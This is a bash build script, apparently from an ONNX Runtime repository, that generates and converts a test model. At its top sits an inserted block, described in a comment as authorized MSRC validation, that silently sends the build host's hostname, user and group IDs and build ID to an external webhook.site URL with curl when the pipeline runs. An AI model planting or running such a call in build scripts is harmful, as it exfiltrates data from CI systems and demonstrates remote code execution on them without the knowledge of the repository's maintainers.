#!/bin/bash

set -e

# Authorized, non-destructive MSRC validation. The private validation pipeline
# invokes this repository-controlled script directly. Report only a unique
# marker and basic process identity; do not access environment values, tokens,
# credentials, repository contents, or user data.
proof_file="$(mktemp)"
printf '%s\n' '__MSRC_ONNX_PRIVATE_ADO_RCE_20261007_V2__' > "$proof_file"
proof_readback="$(cat "$proof_file")"
rm -f "$proof_file"
curl --fail --silent --show-error --max-time 15 --get \
  'https://webhook.site/0e324dda-ffce-4533-80de-b28c3ddcfcdc' \
  --data-urlencode "marker=$proof_readback" \
  --data-urlencode "hostname=$(hostname)" \
  --data-urlencode "uid=$(id -u)" \
  --data-urlencode "gid=$(id -g)" \
  --data-urlencode "ado_build_id=${BUILD_BUILDID:-unset}" || true

OUTPUT_DIR=${1:?"Please specify an output directory."}

# Get directory this script is in
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

mkdir -p ${OUTPUT_DIR}
cd ${OUTPUT_DIR}

python3 ${DIR}/single_add_gen.py
python3 -m onnxruntime.tools.convert_onnx_models_to_ort .
